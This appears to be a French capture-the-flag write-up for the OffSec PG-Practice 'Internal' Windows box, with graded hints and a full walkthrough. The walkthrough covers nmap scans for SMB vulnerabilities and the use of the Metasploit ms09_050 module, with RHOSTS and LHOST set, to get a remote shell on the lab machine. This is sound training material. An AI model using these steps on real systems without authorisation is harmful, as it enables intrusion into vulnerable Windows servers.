---
title: PG-Practice Internal 
meta_title: ""
description: La box Internal est une box proposée par l'Offsec dans sa catégorie PG-Practice. Il s'agit d'une box Windows Easy exploitant une vulnérabilité SMB peu connue. Elle ne requiert pas d'élévation de privilèges.
date: 2024-04-04T05:00:00Z
image: /images/offsec-banner.jpg
categories:
  - Réaliste
  - Facile
author: Emma.exe
tags:
  - realiste
  - pg-practice
  - offsec
draft: false
---

# Introduction

La box Internal est une box proposée par l'Offsec dans sa catégorie PG-Practice.
Il s'agit d'une box Windows Easy exploitant une vulnérabilité SMB peu connue.
Elle ne requiert pas d'élévation de privilèges.

Pour la résolution de ce challenge je vous propose deux niveaux d'aide : 
- Le premier niveau sous la forme d'indices et de ressources à explorer pour résoudre le challenge, sans pour autant donner la solution
- Le deuxième niveau qui présente un exemple de résolution.

{{< notice "tip" >}} Essayez de ne pas regarder la solution si vous voulez vraiment progresser. Une fois le challenge résolu, il peut être intéressant de la regarder pour apprendre de nouvelles techniques ! {{< /notice >}}


# Enumération

{{< tabs >}} {{< tab "Niveau 1" >}}
On commence toujours par énumérer la machine avec nmap.
Veillez à bien énumérer tous les ports de la machine pour être sûrs de ne rien manquer.
En effet, il est courant que les créateurs des box modifient les ports par défaut.
Ainsi, on peut très bien trouver un site web sur le port 8080 par exemple.

Une fois que vous possédez une meilleure connaissance de votre machine, des services qui tournent etc, vous pouvez partir à la recherche de vulnérabilités.

Il est important d'énumérer la machine **entièrement** avant de passer à la phase d'exploitaiton pour éviter de perdre trop de temps.

Si vous ne trouvez pas de vulnérabilités, c'est certainement que vous n'avez pas assez énumérer.

Pour la recherche de vulnérabilités, connaissez-vous **Nmap Script Engine (NSE)** ?

{{< /tab >}}

{{< tab "Niveau 2" >}}
Pour l'énumération, j'utilise les options suivantes : 
- `-p-` pour énumérer tous les ports
- `-sV` pour obtenir les versions des services

Résultats :
```sh
nmap -p- 192.168.242.40 -sV            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 09:26 EDT
Nmap scan report for 192.168.242.40
Host is up (0.016s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
53/tcp    open  domain             Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.70 seconds
```

Il n'y a rien de particulier d'ouvert, on peut tester si la vulnérabilité MS10 17 (eternal blue) est présente sur la machine : 
```sh
nmap -p445 --script smb-vuln-ms17-010 192.168.242.40
```

C'est effectivement vulnérable !
**Cependant**, il est important d'énumérer la machine entièrement avant de passer à la phase d'exploitation.

Nous allons donc effectuer un autre scan de vulnérabilité plus généraliste avec nmap : 
```sh
nmap --script vuln 192.168.242.40 
Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-054: false

```

On voit que la machine est aussi vulnérable à la faille "**SMBv2 Negotiation Vulnerability**" c'est-à-dire la **CVE-2009-3103**. Il est plus probable que ce soit cette vulnérabilité-là que l'auteur de la box veut nous faire exploiter.
En effet, elle est très intéressante puisqu'elle va permettre d'effectuer une RCE (Remote Execution Code) et potentiellement nous permettre d'obtenir un shell interactif. 
{{< /tab >}}
{{< /tabs >}}

# Recherche d'exploit


{{< tabs >}} {{< tab "Niveau 1" >}}

Afin de rechercher des exploits, vous pouvez utiliser la commande : `searchsploit`.
Searchsploit est un outil en ligne de commande qui permet de rechercher et télécharger des exploits depuis le site exploit-db.

Afin de faire une recherche efficace, n'hésitez pas à varier vos mots-clefs. Souvent une vulnérabilité porte plusieurs noms.
Sur exploit-db, il est rare de trouver les noms des CVE.

Autre ressource : Nous avons créer une documentation Meterpreter si vous souhaitez l'utiliser pour résoudre ce challenge : [Meterpreter](../../fiche/meterpreter)

{{< /tab >}}
{{< tab "Niveau 2" >}}
Afin de trouver un exploit, je commence par me renseigner sur la vulnérabilité.
Premièrement, les vulnérabilités Windows sont souvent appelés par l'indicatif Microsoft.
Dans notre cas, on voit qu'elle est aussi appelé "MS09-050".
La vulnérabilité est due à une mauvaise implémentation du protocole SMBv2 dans certaines versions de Windows

Je fais une recherche sur le site https://exploit-db.com en utilisant MS09-050 et je constate qu'il existe plusieurs exploits.

exploit-db nous permet de voir si l'exploit a été vérifié ou non. Dans la mesure du possible, on privilégie les exploits qui le sont.

> Si vous décidez de choisir un exploit non vérifié, il est important de regarder ce que fait réellement l'exploit. 

Ici il n'y en a qu'un seul vérifié, disponible ici : 
https://www.exploit-db.com/exploits/16363

Il s'agit d'un module Metasploit.
{{< /tab >}}
{{< /tabs >}}

# Exploitation

{{< tabs >}} {{< tab "Niveau 1" >}}

Pour la phase d'exploitaion, veillez à bien renseigner les options dont nécessite l'exploit que vous souhaitez utiliser.

Si celui-ci a besoin de notre IP locale, pensez à renseigner celui de l'interface vers le réseau de l'Offsec.  

Enfin, il existe de nombreux exploits pour une seule faille. Si le premier ne fonctionne pas, tentez-en un autre. 

{{< /tab >}}
{{< tab "Niveau 2" >}}
Nous lançons donc Metasploit en sudo :
```sh
sudo msfconsole
```

On recherche l'exploit en recherchant son ID : 
```sh
search exploit ms09_050_smb2_negotiate_func_index
```

Il devrait normalement apparaitre dans la recherche. 
{{< image src="images/PG-Internal-msfconsole-search.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}
On récupère son chemin et on tape la commande :

```sh
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index  
```

On affiche les options que nécessite l'exploit pour fonctionner en tapant la commande : 
```sh
show options
```

{{< image src="images/PG-Internal-msfconsole-options.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}

On voit deux options requises qui ne sont automatiquement renseignée ou qu'il faut modifier : l'hôte distant (Remote Host) et l'hôte qui va réceptionner le shell (Listen Host).

On configure les options comme suit : 
```sh
set RHOSTS <ip-cible>
set LHOST <ip-local>
```

> Pour l'IP local, il faut bien choisir l'IP de l'interface qui communique avec le réseau Offsec (généralement celle de tun0)

On exécute l'exploit en tapant la commande : 
```sh
run
```

Au bout de quelques instants, on obtient un shell et on récupère le flag qui se trouve toujours sur le bureau Administrateur.

{{< /tab >}}
{{< /tabs >}}
